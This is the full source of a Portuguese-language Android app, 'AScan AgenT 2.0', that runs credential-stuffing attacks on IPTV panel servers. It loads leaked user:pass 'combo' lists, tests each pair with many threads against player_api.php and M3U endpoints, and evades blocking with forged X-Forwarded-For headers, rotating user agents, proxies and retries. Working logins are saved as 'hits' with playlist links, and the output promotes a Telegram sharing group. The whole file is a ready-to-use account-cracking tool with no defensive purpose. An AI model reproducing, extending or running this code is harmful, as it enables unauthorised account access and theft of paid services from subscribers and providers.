# -*- coding: utf-8 -*-
"""
AScan AgenT 2.0 - Android App
Interface grafica nativa com Kivy
"""

import os
import sys
import time
import datetime
import threading
import queue
import random
import re
import socket
import json
import subprocess
from collections import defaultdict, deque

from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.gridlayout import GridLayout
from kivy.uix.scrollview import ScrollView
from kivy.uix.label import Label
from kivy.uix.button import Button
from kivy.uix.textinput import TextInput
from kivy.uix.popup import Popup
from kivy.uix.filechooser import FileChooserListView
from kivy.uix.spinner import Spinner
from kivy.uix.togglebutton import ToggleButton
from kivy.clock import Clock
from kivy.core.window import Window
from kivy.properties import BooleanProperty
from kivy.graphics import Color, RoundedRectangle
from kivy.utils import get_color_from_hex

THEME = {
    'bg': '#0D1117',
    'card': '#161B22',
    'border': '#30363D',
    'text': '#C9D1D9',
    'text_dim': '#8B949E',
    'accent': '#58A6FF',
    'success': '#238636',
    'warning': '#F0883E',
    'danger': '#DA3633',
    'gold': '#E3B341',
    'purple': '#8957E5',
}

try:
    import requests
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
except ImportError:
    pass

try:
    import cloudscraper
    CLOUDSCRAPER_AVAILABLE = True
except ImportError:
    CLOUDSCRAPER_AVAILABLE = False

try:
    import dns.resolver
    DNS_AVAILABLE = True
except ImportError:
    DNS_AVAILABLE = False

def _detect_storage_root():
    candidates = [
        os.environ.get('EXTERNAL_STORAGE'),
        os.environ.get('SECONDARY_STORAGE'),
        '/storage/emulated/0',
        '/sdcard',
        os.path.expanduser('~'),
    ]
    for c in candidates:
        if c and os.path.isdir(c):
            return c
    return os.path.expanduser('~')

BASE_DIR = _detect_storage_root()
OUT_DIR = os.path.join(BASE_DIR, 'AScan_AgenT')
COMBO_DIR = os.path.join(BASE_DIR, 'AScan_Combo')
HITS_DIR = os.path.join(OUT_DIR, 'HITS')
COMBO_HITS_DIR = os.path.join(OUT_DIR, 'COMBO')
PROXY_DIR = os.path.join(OUT_DIR, 'proxys')

COMMON_COMBO_PATHS = [
    COMBO_DIR,
    os.path.join(BASE_DIR, 'Download'),
    os.path.join(BASE_DIR, 'Downloads'),
    os.path.join(BASE_DIR, 'Documents'),
    os.path.join(BASE_DIR, 'Telegram'),
    os.path.join(BASE_DIR, 'Telegram', 'Telegram Documents'),
    os.path.join(BASE_DIR, 'Android', 'media', 'org.telegram.messenger'),
    os.path.join(BASE_DIR, 'DCIM'),
    BASE_DIR,
]

for d in [OUT_DIR, COMBO_DIR, HITS_DIR, COMBO_HITS_DIR, PROXY_DIR]:
    try:
        os.makedirs(d, exist_ok=True)
    except Exception:
        pass

_pause_scan = threading.Event()
_stop_early = threading.Event()
_RESULTS_LOCK = threading.Lock()
_FILE_LOCK = threading.Lock()
COMBO_ATUAL_NOME = ''
STATS_GERAIS = {'hits': 0, 'hits_ilimitados': 0, 'checks': 0, 'start_time': 0}
SESSION_CACHE = {}
SESSION_CACHE_LOCK = threading.Lock()
DNS_CACHE = {}
DNS_CACHE_LOCK = threading.Lock()

USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
    'TiviMate/4.7.0 (Android 11; NVIDIA SHIELD TV Pro)',
    'okhttp/5.2.0',
]
ACCEPT_LANGS = ['en-US,en;q=0.9', 'pt-BR,pt;q=0.9']
REFERERS = ['http://www.google.com/', 'https://www.youtube.com/', '']

def get_headers_avancados():
    headers = {
        'User-Agent': random.choice(USER_AGENTS),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': random.choice(ACCEPT_LANGS),
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'DNT': random.choice(['1', '0']),
        'Upgrade-Insecure-Requests': '1',
        'Cache-Control': 'no-cache',
    }
    ip_fake = '%d.%d.%d.%d' % (random.randint(1,255), random.randint(1,255), random.randint(1,255), random.randint(1,255))
    headers.update({'X-Forwarded-For': ip_fake, 'X-Real-IP': ip_fake, 'Client-IP': ip_fake})
    if random.random() > 0.3:
        headers['Referer'] = random.choice(REFERERS)
    return headers

def get_session_hibrida(server=None, proxy=None):
    session_key = '%s_%s' % (server, proxy)
    with SESSION_CACHE_LOCK:
        if session_key in SESSION_CACHE:
            session, timestamp = SESSION_CACHE[session_key]
            if time.time() - timestamp < 300:
                return session
    session = requests.Session()
    session.headers.update(get_headers_avancados())
    if proxy:
        session.proxies = {'http': proxy, 'https': proxy}
    with SESSION_CACHE_LOCK:
        SESSION_CACHE[session_key] = (session, time.time())
    return session

def renew_session_hibrida(server=None, proxy=None):
    session_key = '%s_%s' % (server, proxy)
    with SESSION_CACHE_LOCK:
        if session_key in SESSION_CACHE:
            del SESSION_CACHE[session_key]
    return get_session_hibrida(server, proxy)

def resolve_dns_hibrido(host):
    with DNS_CACHE_LOCK:
        if host in DNS_CACHE:
            entry = DNS_CACHE[host]
            if time.time() - entry['timestamp'] < 1800:
                return entry['ip']
    ip = None
    if DNS_AVAILABLE:
        try:
            resolver = dns.resolver.Resolver()
            resolver.timeout = 2
            resolver.lifetime = 2
            answers = resolver.resolve(host, 'A')
            for rdata in answers:
                ip = str(rdata)
                break
        except Exception:
            pass
    if not ip:
        try:
            ip = socket.gethostbyname(host)
        except Exception:
            pass
    if ip:
        with DNS_CACHE_LOCK:
            DNS_CACHE[host] = {'ip': ip, 'timestamp': time.time()}
    return ip

def fetch_json_hibrido(url, timeout=10, server=None, proxy=None, max_retries=3):
    for attempt in range(max_retries):
        try:
            session = get_session_hibrida(server, proxy)
            headers = get_headers_avancados()
            if hasattr(session, 'headers'):
                session.headers.update(headers)
            if attempt > 0:
                time.sleep(random.uniform(1, 3) * attempt)
            r = session.get(url, timeout=timeout, verify=False, allow_redirects=True)
            if r.status_code == 200:
                try:
                    return r.json()
                except Exception:
                    return None
            elif r.status_code in [403, 429, 520] and attempt < max_retries - 1:
                renew_session_hibrida(server, proxy)
                time.sleep(random.uniform(2, 5))
                continue
            return None
        except Exception:
            if attempt < max_retries - 1:
                time.sleep(random.uniform(1, 2))
                continue
            return None
    return None

def resolve_ip(host):
    return resolve_dns_hibrido(host) or ''

def geo_lookup(ip):
    try:
        r = requests.get('http://ip-api.com/json/%s?fields=status,country,countryCode,regionName,city,isp' % ip, timeout=8)
        if r.status_code == 200:
            j = r.json()
            if j.get('status') == 'success':
                return {
                    'country': j.get('country', ''),
                    'countryCode': j.get('countryCode', ''),
                    'region': j.get('regionName', ''),
                    'city': j.get('city', ''),
                    'isp': j.get('isp', ''),
                }
    except Exception:
        pass
    return {'country': '', 'countryCode': '', 'region': '', 'city': '', 'isp': ''}

def country_flag(cc):
    try:
        if not cc or len(cc) != 2:
            return ''
        return chr(0x1F1E6 + ord(cc[0].upper()) - ord('A')) + chr(0x1F1E6 + ord(cc[1].upper()) - ord('A'))
    except Exception:
        return ''

def describe_geo(geo):
    try:
        parts = []
        if geo.get('city'):
            parts.append(geo['city'])
        if geo.get('region'):
            parts.append(geo['region'])
        if geo.get('country'):
            parts.append(geo['country'])
        flag = country_flag(geo.get('countryCode', ''))
        return ', '.join(parts) + ' ' + flag if parts else 'Desconhecido'
    except Exception:
        return 'Desconhecido'

def _safe_text(b):
    if isinstance(b, str):
        return b
    try:
        return b.decode('utf-8', errors='ignore')
    except Exception:
        return str(b)

def check_target(server, item, timeout=8, proxy=None):
    user, pwd = item
    url = 'http://%s/player_api.php?username=%s&password=%s' % (server, user, pwd)
    data = fetch_json_hibrido(url, timeout=timeout, server=server, proxy=proxy)
    if data:
        status = str(data.get('user_info', {}).get('status', '')).lower()
        if status in ['active', '1', 'true', 'ok']:
            return (True, data)
    try:
        m3u_url = 'http://%s/get.php?username=%s&password=%s&type=m3u_plus&output=ts' % (server, user, pwd)
        session = get_session_hibrida(server, proxy)
        r = session.get(m3u_url, timeout=timeout, verify=False)
        if r.status_code == 200 and r.content:
            txt = _safe_text(r.content)
            if '#EXTM3U' in txt or '#EXTINF' in txt:
                return (True, {'user_info': {'status': 'active'}, 'm3u_fallback': True})
    except Exception:
        pass
    return (False, {})

def fetch_counts(server, user, pwd):
    try:
        base = 'http://%s/player_api.php?username=%s&password=%s' % (server, user, pwd)
        canais = fetch_json_hibrido(base + '&action=get_live_streams', server=server) or []
        filmes = fetch_json_hibrido(base + '&action=get_vod_streams', server=server) or []
        series = fetch_json_hibrido(base + '&action=get_series', server=server) or []
        return (len(canais), len(filmes), len(series))
    except Exception:
        return (0, 0, 0)

def remover_ansi(texto):
    return re.compile(r'\x1B\[[0-?]*[ -/]*[@-~]').sub('', texto)

def build_hit_text(server, item, data):
    user, pwd = item
    ui = data.get('user_info', {})
    host = server.split(':')[0]
    port = server.split(':')[1] if ':' in server else '80'
    ip = resolve_ip(host)
    geo_txt = describe_geo(geo_lookup(ip) if ip else {})
    canais, filmes, series = fetch_counts(server, user, pwd)
    total = canais + filmes + series
    exp = ui.get('exp_date', '0')
    is_ilimitado = False
    dias_restantes = 0
    if exp in ['0', 'null', 'None', '']:
        is_ilimitado = True
    else:
        try:
            exp_ts = int(exp)
            dias_restantes = int((exp_ts - time.time()) / 86400)
            if dias_restantes > 365:
                is_ilimitado = True
        except Exception:
            is_ilimitado = True
    created_at = ui.get('created_at', '0')
    created_str = 'N/A'
    if created_at and created_at != '0':
        try:
            created_str = datetime.datetime.fromtimestamp(int(created_at)).strftime('%d/%m/%Y')
        except Exception:
            pass
    exp_str = 'Ilimitado'
    if not is_ilimitado and exp not in ['0', 'null', 'None', '']:
        try:
            exp_str = datetime.datetime.fromtimestamp(int(exp)).strftime('%d/%m/%Y')
        except Exception:
            pass
    m3u = 'http://%s/get.php?username=%s&password=%s&type=m3u_plus&output=ts' % (server, user, pwd)
    epg = 'http://%s/xmltv.php?username=%s&password=%s' % (host, user, pwd)
    template = '''AScan AgenT 2.0 [HIT]
Servidor  -> http://%s
DNS Real  -> %s:%s
Local     -> %s
--------------------------
Usuario   -> %s
Senha     -> %s
Status    -> [ONLINE]
Plano     -> %s
Conexoes  -> %s/%s
Criado em -> %s
Expira em -> %s
Restam    -> %s
Canais    -> %d
Filmes    -> %d
Series    -> %d
Total     -> %d
--------------------------
M3U       -> %s
EPG       -> %s
Combo     -> %s
--------------------------
Grupo    -> AScan
Telegram -> https://t.me/+UfgoBcTQpwBlMDMx
''' % (
        server, host, port, geo_txt, user, pwd,
        'ILIMITADO' if is_ilimitado else 'PREMIUM',
        ui.get('active_cons', '0'), ui.get('max_connections', '1'),
        created_str, exp_str,
        ('Ilimitado' if is_ilimitado else '%d Dias' % dias_restantes),
        canais, filmes, series, total, m3u, epg, COMBO_ATUAL_NOME,
    )
    return template, is_ilimitado

def save_hit(server, texto, is_ilimitado=False):
    try:
        with _FILE_LOCK:
            host = server.split(':')[0]
            safe_host = host.replace('.', '_').replace('/', '_')
            data_str = datetime.datetime.now().strftime('%d-%m')
            filename = '%s_%s.txt' % (data_str, safe_host)
            texto_limpo = remover_ansi(texto)
            timestamp = datetime.datetime.now().strftime('%d/%m/%Y %H:%M:%S')
            texto_completo = '[%s]\n%s\n' % (timestamp, texto_limpo)
            path = os.path.join(HITS_DIR, filename)
            with open(path, 'a', encoding='utf-8') as f:
                f.write(texto_completo + '\n\n')
            with open(os.path.join(HITS_DIR, 'HITS_GERAL.txt'), 'a', encoding='utf-8') as f:
                f.write(texto_completo + '\n\n')
            if is_ilimitado:
                with open(os.path.join(HITS_DIR, 'ILIMITADOS.txt'), 'a', encoding='utf-8') as f:
                    f.write(texto_completo + '\n\n')
            STATS_GERAIS['hits'] += 1
            if is_ilimitado:
                STATS_GERAIS['hits_ilimitados'] += 1
            return True
    except Exception:
        return False

def save_combo_for_server(server, user, pwd):
    try:
        with _FILE_LOCK:
            host = server.split(':')[0]
            safe_host = host.replace('.', '_').replace('/', '_')
            path = os.path.join(COMBO_HITS_DIR, '%s.txt' % safe_host)
            with open(path, 'a', encoding='utf-8') as f:
                f.write('%s:%s\n' % (user, pwd))
    except Exception:
        pass

def _first_existing_path(paths):
    for p in paths:
        try:
            if p and os.path.isdir(p):
                return p
        except Exception:
            pass
    return BASE_DIR

class Card(BoxLayout):
    def __init__(self, title='', **kwargs):
        super().__init__(**kwargs)
        self.orientation = 'vertical'
        self.padding = [14, 12, 14, 12]
        self.spacing = 10
        self.size_hint_y = None
        self.bind(minimum_height=self.setter('height'))
        with self.canvas.before:
            Color(*get_color_from_hex(THEME['card']))
            self.rect = RoundedRectangle(pos=self.pos, size=self.size, radius=[14])
        self.bind(pos=self._sync, size=self._sync)
        if title:
            lbl = Label(
                text='[b]%s[/b]' % title,
                markup=True,
                color=get_color_from_hex(THEME['accent']),
                font_size='15sp',
                size_hint_y=None,
                height=28,
                halign='left',
                valign='middle',
            )
            lbl.bind(size=lambda i, v: setattr(i, 'text_size', v))
            self.add_widget(lbl)

    def _sync(self, *args):
        self.rect.pos = self.pos
        self.rect.size = self.size

class StyledButton(Button):
    def __init__(self, btn_type='primary', **kwargs):
        height = kwargs.pop('height', 48)
        super().__init__(**kwargs)
        self.background_normal = ''
        self.background_down = ''
        colors = {
            'primary': THEME['accent'],
            'success': THEME['success'],
            'warning': THEME['warning'],
            'danger': THEME['danger'],
            'ghost': THEME['border'],
        }
        self.background_color = get_color_from_hex(colors.get(btn_type, THEME['accent']))
        self.color = (1, 1, 1, 1)
        self.bold = True
        self.font_size = '14sp'
        if kwargs.get('size_hint_y') is None and 'size_hint_y' not in kwargs:
            self.size_hint_y = None
            self.height = height

class StyledInput(TextInput):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.background_color = get_color_from_hex('#0A0E14')
        self.foreground_color = get_color_from_hex(THEME['text'])
        self.cursor_color = get_color_from_hex(THEME['accent'])
        self.hint_text_color = get_color_from_hex(THEME['text_dim'])
        self.padding = [12, 12, 12, 12]
        self.font_size = '15sp'
        self.multiline = False
        self.size_hint_y = None
        self.height = 48
        self.write_tab = False

class SectionLabel(Label):
    def __init__(self, text='', **kwargs):
        super().__init__(**kwargs)
        self.text = text
        self.color = get_color_from_hex(THEME['text'])
        self.font_size = '13sp'
        self.size_hint_y = None
        self.height = 28
        self.halign = 'left'
        self.valign = 'middle'
        self.bind(size=lambda i, v: setattr(i, 'text_size', v))

class LogLabel(Label):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.color = get_color_from_hex(THEME['text'])
        self.font_size = '12sp'
        self.halign = 'left'
        self.valign = 'top'
        self.markup = True
        self.size_hint_y = None
        self.bind(texture_size=self._upd_h, width=self._upd_w)

    def _upd_w(self, *a):
        self.text_size = (max(self.width - 4, 10), None)

    def _upd_h(self, *a):
        self.height = max(self.texture_size[1] + 8, 36)

class AScanApp(App):
    scan_running = BooleanProperty(False)
    scan_paused = BooleanProperty(False)

    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.servers = []
        self.combo_items = []
        self.stats = {'hits': 0, 'checks': 0, 'start': 0}
        self.scan_thread = None
        self.update_clock = None
        Window.clearcolor = get_color_from_hex(THEME['bg'])
        try:
            Window.softinput_mode = 'below_target'
        except Exception:
            pass

    def build(self):
        root = BoxLayout(orientation='vertical', padding=[12, 10, 12, 10], spacing=8)

        header = BoxLayout(size_hint_y=None, height=44, spacing=6)
        title = Label(
            text='[b]AScan AgenT 2.0[/b]',
            markup=True,
            font_size='20sp',
            color=get_color_from_hex(THEME['accent']),
            size_hint_x=0.72,
            halign='left',
            valign='middle',
        )
        title.bind(size=lambda i, v: setattr(i, 'text_size', v))
        self.status_label = Label(
            text='[color=238636]\u25cf[/color] Pronto',
            markup=True,
            font_size='12sp',
            size_hint_x=0.28,
            halign='right',
            valign='middle',
        )
        self.status_label.bind(size=lambda i, v: setattr(i, 'text_size', v))
        header.add_widget(title)
        header.add_widget(self.status_label)
        root.add_widget(header)

        scroll = ScrollView(do_scroll_x=False, bar_width=6)
        content = GridLayout(cols=1, spacing=12, size_hint_y=None, padding=[0, 4, 0, 12])
        content.bind(minimum_height=content.setter('height'))

        card_srv = Card(title='Servidores (max 5)')
        self.server_inputs = []
        for i in range(5):
            inp = StyledInput(hint_text='Servidor %d  ex: host:port' % (i + 1))
            self.server_inputs.append(inp)
            card_srv.add_widget(inp)
        content.add_widget(card_srv)

        card_combo = Card(title='Combo (.txt user:pass)')
        self.combo_label = Label(
            text='Nenhum arquivo carregado',
            color=get_color_from_hex(THEME['text_dim']),
            font_size='13sp',
            size_hint_y=None,
            height=32,
            halign='left',
            valign='middle',
        )
        self.combo_label.bind(size=lambda i, v: setattr(i, 'text_size', v))
        card_combo.add_widget(self.combo_label)
        btn_row = BoxLayout(size_hint_y=None, height=48, spacing=8)
        btn_pick = StyledButton(text='Procurar TXT', btn_type='primary')
        btn_pick.bind(on_press=self.show_file_chooser)
        btn_paste = StyledButton(text='Colar caminho', btn_type='ghost')
        btn_paste.bind(on_press=self.show_path_popup)
        btn_row.add_widget(btn_pick)
        btn_row.add_widget(btn_paste)
        card_combo.add_widget(btn_row)
        content.add_widget(card_combo)

        card_cfg = Card(title='Configuracoes')
        modo_row = BoxLayout(size_hint_y=None, height=48, spacing=8)
        modo_row.add_widget(SectionLabel(text='Modo', size_hint_x=0.28))
        self.modo_spinner = Spinner(
            text='Adaptativo',
            values=['Padrao', 'Adaptativo', 'Furtivo', 'Camaleao', 'Bypass Intenso'],
            size_hint_x=0.72,
            background_normal='',
            background_color=get_color_from_hex('#0A0E14'),
            color=get_color_from_hex(THEME['text']),
            font_size='14sp',
        )
        modo_row.add_widget(self.modo_spinner)
        card_cfg.add_widget(modo_row)
        thr_row = BoxLayout(size_hint_y=None, height=48, spacing=8)
        thr_row.add_widget(SectionLabel(text='Threads', size_hint_x=0.28))
        self.threads_input = StyledInput(text='20', size_hint_x=0.72, input_filter='int')
        thr_row.add_widget(self.threads_input)
        card_cfg.add_widget(thr_row)
        self.proxy_toggle = ToggleButton(
            text='Proxy: OFF',
            size_hint_y=None,
            height=44,
            background_normal='',
            background_color=get_color_from_hex(THEME['border']),
            color=get_color_from_hex(THEME['text']),
            font_size='13sp',
        )
        self.proxy_toggle.bind(on_press=self._on_proxy_toggle)
        card_cfg.add_widget(self.proxy_toggle)
        content.add_widget(card_cfg)

        card_stats = Card(title='Estatisticas')
        stats_grid = GridLayout(cols=2, spacing=6, size_hint_y=None, height=90)
        self.stats_labels = {}
        for key, default in [
            ('checks', 'Checks: 0'),
            ('hits', 'Hits: 0'),
            ('ilimitados', 'Ilimitados: 0'),
            ('cpm', 'CPM: 0'),
            ('tempo', 'Tempo: 00:00'),
            ('combo', 'Combo: 0'),
        ]:
            lbl = Label(
                text=default,
                color=get_color_from_hex(THEME['text']),
                font_size='13sp',
                size_hint_y=None,
                height=28,
                halign='left',
                valign='middle',
            )
            lbl.bind(size=lambda i, v: setattr(i, 'text_size', v))
            self.stats_labels[key] = lbl
            stats_grid.add_widget(lbl)
        card_stats.add_widget(stats_grid)
        content.add_widget(card_stats)

        card_log = Card(title='Log')
        self.log_label = LogLabel(text='Aguardando inicio...')
        card_log.add_widget(self.log_label)
        content.add_widget(card_log)

        scroll.add_widget(content)
        root.add_widget(scroll)

        controls = BoxLayout(size_hint_y=None, height=52, spacing=8)
        self.btn_start = StyledButton(text='INICIAR', btn_type='success')
        self.btn_start.bind(on_press=self.start_scan)
        self.btn_pause = StyledButton(text='PAUSAR', btn_type='warning')
        self.btn_pause.bind(on_press=self.toggle_pause)
        self.btn_stop = StyledButton(text='PARAR', btn_type='danger')
        self.btn_stop.bind(on_press=self.stop_scan)
        controls.add_widget(self.btn_start)
        controls.add_widget(self.btn_pause)
        controls.add_widget(self.btn_stop)
        root.add_widget(controls)
        return root

    def _on_proxy_toggle(self, btn):
        if btn.state == 'down':
            btn.text = 'Proxy: ON'
            btn.background_color = get_color_from_hex(THEME['success'])
        else:
            btn.text = 'Proxy: OFF'
            btn.background_color = get_color_from_hex(THEME['border'])

    def show_path_popup(self, instance):
        box = BoxLayout(orientation='vertical', spacing=10, padding=10)
        tip = Label(
            text='Cole o caminho completo do .txt\nex: /sdcard/Download/combo.txt',
            size_hint_y=None,
            height=48,
            color=get_color_from_hex(THEME['text_dim']),
            font_size='12sp',
        )
        inp = StyledInput(hint_text='/sdcard/Download/combo.txt')
        btn = StyledButton(text='Carregar', btn_type='success', height=48)
        box.add_widget(tip)
        box.add_widget(inp)
        box.add_widget(btn)
        popup = Popup(title='Caminho do combo', content=box, size_hint=(0.92, 0.4))

        def load(_):
            path = (inp.text or '').strip()
            if path:
                self.load_combo(path)
                popup.dismiss()
        btn.bind(on_press=load)
        popup.open()

    def show_file_chooser(self, instance):
        start = _first_existing_path(COMMON_COMBO_PATHS)
        box = BoxLayout(orientation='vertical', spacing=8, padding=[8, 8, 8, 8])

        shortcuts = BoxLayout(size_hint_y=None, height=40, spacing=4)
        shortcut_defs = [
            ('Combo', COMBO_DIR),
            ('Download', os.path.join(BASE_DIR, 'Download')),
            ('Docs', os.path.join(BASE_DIR, 'Documents')),
            ('Telegram', os.path.join(BASE_DIR, 'Telegram')),
            ('SD', BASE_DIR),
        ]

        path_lbl = Label(
            text=start,
            size_hint_y=None,
            height=24,
            font_size='11sp',
            color=get_color_from_hex(THEME['text_dim']),
            halign='left',
        )
        path_lbl.bind(size=lambda i, v: setattr(i, 'text_size', v))

        fc = FileChooserListView(
            path=start,
            filters=['*.txt', '*.TXT', '*.csv', '*.list'],
            size_hint_y=1,
        )

        def go_to(path):
            def _inner(_btn):
                p = path if os.path.isdir(path) else BASE_DIR
                try:
                    fc.path = p
                    path_lbl.text = p
                except Exception:
                    pass
            return _inner

        for name, pth in shortcut_defs:
            b = Button(
                text=name,
                background_normal='',
                background_color=get_color_from_hex(THEME['border']),
                font_size='11sp',
                color=get_color_from_hex(THEME['text']),
            )
            b.bind(on_press=go_to(pth))
            shortcuts.add_widget(b)

        filter_row = BoxLayout(size_hint_y=None, height=36, spacing=6)
        btn_txt = Button(text='So .txt', background_normal='', background_color=get_color_from_hex(THEME['accent']), font_size='12sp')
        btn_all = Button(text='Todos', background_normal='', background_color=get_color_from_hex(THEME['border']), font_size='12sp', color=get_color_from_hex(THEME['text']))

        def only_txt(_):
            fc.filters = ['*.txt', '*.TXT', '*.csv', '*.list']
            btn_txt.background_color = get_color_from_hex(THEME['accent'])
            btn_all.background_color = get_color_from_hex(THEME['border'])

        def all_files(_):
            fc.filters = []
            btn_all.background_color = get_color_from_hex(THEME['accent'])
            btn_txt.background_color = get_color_from_hex(THEME['border'])

        btn_txt.bind(on_press=only_txt)
        btn_all.bind(on_press=all_files)
        filter_row.add_widget(btn_txt)
        filter_row.add_widget(btn_all)

        def on_path(instance, value):
            path_lbl.text = value
        fc.bind(path=on_path)

        btn_sel = StyledButton(text='Selecionar arquivo', btn_type='success', height=48)
        popup = Popup(title='Escolher combo (.txt)', content=box, size_hint=(0.96, 0.9))

        def select(_):
            sel = fc.selection
            if not sel:
                self.add_log('Selecione um arquivo .txt')
                return
            path = sel[0]
            if os.path.isdir(path):
                self.add_log('Selecione um ARQUIVO, nao pasta')
                return
            self.load_combo(path)
            popup.dismiss()

        btn_sel.bind(on_press=select)
        box.add_widget(shortcuts)
        box.add_widget(path_lbl)
        box.add_widget(filter_row)
        box.add_widget(fc)
        box.add_widget(btn_sel)
        popup.open()

    def load_combo(self, path):
        try:
            if not os.path.isfile(path):
                self.add_log('Arquivo nao encontrado: %s' % path)
                return
            items = []
            with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    line = line.strip()
                    if not line or line.startswith('#'):
                        continue
                    if ':' in line:
                        u, p = line.split(':', 1)
                        u, p = u.strip(), p.strip()
                        if u and p:
                            items.append((u, p))
            if not items:
                self.add_log('Nenhuma linha user:pass valida em %s' % os.path.basename(path))
                return
            self.combo_items = items
            global COMBO_ATUAL_NOME
            name = os.path.basename(path)
            COMBO_ATUAL_NOME = name
            self.combo_label.text = '%s  (%d contas)' % (name, len(items))
            self.combo_label.color = get_color_from_hex(THEME['success'])
            self.stats_labels['combo'].text = 'Combo: %d' % len(items)
            self.add_log('Combo OK: %s (%d)' % (name, len(items)))
        except Exception as e:
            self.add_log('Erro ao ler combo: %s' % e)

    def add_log(self, msg):
        ts = datetime.datetime.now().strftime('%H:%M:%S')
        line = '[%s] %s' % (ts, msg)
        cur = self.log_label.text
        if cur == 'Aguardando inicio...':
            self.log_label.text = line
        else:
            lines = (cur + '\n' + line).split('\n')
            self.log_label.text = '\n'.join(lines[-50:])

    def start_scan(self, instance):
        if self.scan_running:
            return
        servers = [i.text.strip() for i in self.server_inputs if i.text.strip()]
        if not servers:
            self.add_log('Informe ao menos 1 servidor (host:porta)')
            return
        if not self.combo_items:
            self.add_log('Carregue um combo .txt primeiro')
            return
        try:
            threads = int(self.threads_input.text.strip() or '20')
        except Exception:
            threads = 20
        threads = max(1, min(threads, 100))

        self.servers = servers
        self.scan_running = True
        self.scan_paused = False
        _pause_scan.clear()
        _stop_early.clear()
        self.stats = {'hits': 0, 'checks': 0, 'start': time.time()}
        self.status_label.text = '[color=F0883E]\u25cf[/color] Rodando'
        self.btn_start.disabled = True
        self.add_log('Scan: %d srv | %d combo | %d threads' % (len(servers), len(self.combo_items), threads))

        self.scan_thread = threading.Thread(
            target=self._scan_worker,
            args=(servers, list(self.combo_items), threads),
            daemon=True,
        )
        self.scan_thread.start()
        self.update_clock = Clock.schedule_interval(self._update_stats_ui, 1.0)

    def _scan_worker(self, servers, items, threads):
        q = queue.Queue()
        for item in items:
            q.put(item)

        def worker(server):
            while not _stop_early.is_set():
                if _pause_scan.is_set():
                    time.sleep(0.25)
                    continue
                try:
                    item = q.get_nowait()
                except queue.Empty:
                    break
                try:
                    ok, data = check_target(server, item, timeout=8)
                    with _RESULTS_LOCK:
                        self.stats['checks'] += 1
                    if ok:
                        texto, is_ilim = build_hit_text(server, item, data)
                        save_hit(server, texto, is_ilim)
                        save_combo_for_server(server, item[0], item[1])
                        with _RESULTS_LOCK:
                            self.stats['hits'] += 1
                        u = item[0]
                        Clock.schedule_once(lambda dt, s=server, uu=u: self.add_log('HIT %s | %s' % (s, uu)), 0)
                except Exception:
                    pass
                finally:
                    try:
                        q.task_done()
                    except Exception:
                        pass

        pool = []
        per = max(1, threads // max(len(servers), 1))
        for server in servers:
            for _ in range(per):
                t = threading.Thread(target=worker, args=(server,), daemon=True)
                t.start()
                pool.append(t)
        for t in pool:
            t.join()
        Clock.schedule_once(lambda dt: self._on_scan_finished(), 0)

    def _on_scan_finished(self):
        self.scan_running = False
        self.btn_start.disabled = False
        self.status_label.text = '[color=238636]\u25cf[/color] Pronto'
        self.add_log('Fim | Hits: %d | Checks: %d' % (self.stats['hits'], self.stats['checks']))
        if self.update_clock:
            self.update_clock.cancel()

    def _update_stats_ui(self, dt):
        elapsed = max(time.time() - self.stats['start'], 1)
        cpm = (self.stats['checks'] / elapsed) * 60
        mins, secs = int(elapsed // 60), int(elapsed % 60)
        self.stats_labels['checks'].text = 'Checks: %d' % self.stats['checks']
        self.stats_labels['hits'].text = 'Hits: %d' % self.stats['hits']
        self.stats_labels['ilimitados'].text = 'Ilimitados: %d' % STATS_GERAIS.get('hits_ilimitados', 0)
        self.stats_labels['cpm'].text = 'CPM: %.0f' % cpm
        self.stats_labels['tempo'].text = 'Tempo: %02d:%02d' % (mins, secs)

    def toggle_pause(self, instance):
        if not self.scan_running:
            return
        if self.scan_paused:
            _pause_scan.clear()
            self.scan_paused = False
            self.btn_pause.text = 'PAUSAR'
            self.status_label.text = '[color=F0883E]\u25cf[/color] Rodando'
            self.add_log('Retomado')
        else:
            _pause_scan.set()
            self.scan_paused = True
            self.btn_pause.text = 'RETOMAR'
            self.status_label.text = '[color=E3B341]\u25cf[/color] Pausado'
            self.add_log('Pausado')

    def stop_scan(self, instance):
        if not self.scan_running:
            return
        _stop_early.set()
        _pause_scan.clear()
        self.scan_running = False
        self.scan_paused = False
        self.btn_start.disabled = False
        self.btn_pause.text = 'PAUSAR'
        self.status_label.text = '[color=238636]\u25cf[/color] Pronto'
        self.add_log('Parado pelo usuario')
        if self.update_clock:
            self.update_clock.cancel()


if __name__ == '__main__':
    AScanApp().run()
